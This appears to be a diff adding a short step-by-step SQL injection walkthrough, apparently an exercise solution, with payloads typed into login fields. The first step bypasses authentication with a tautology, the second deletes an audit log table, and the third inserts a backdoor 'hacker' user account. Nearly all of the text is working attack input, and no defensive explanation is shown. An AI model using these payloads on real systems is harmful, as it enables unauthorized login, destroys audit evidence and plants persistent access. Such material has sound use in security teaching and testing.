@@ -1,0 +1,11 @@
+Step 1: Login
+username:       ' or 'a'='a
+password:       ' or 'a'='a
+
+Step 2: Delete audit log
+username:       '; delete from Audit;#
+password:       (any)
+
+Step 3: Add new user
+username:       '; insert user(username, password) values('hacker', 'password');#
+password:       (any)
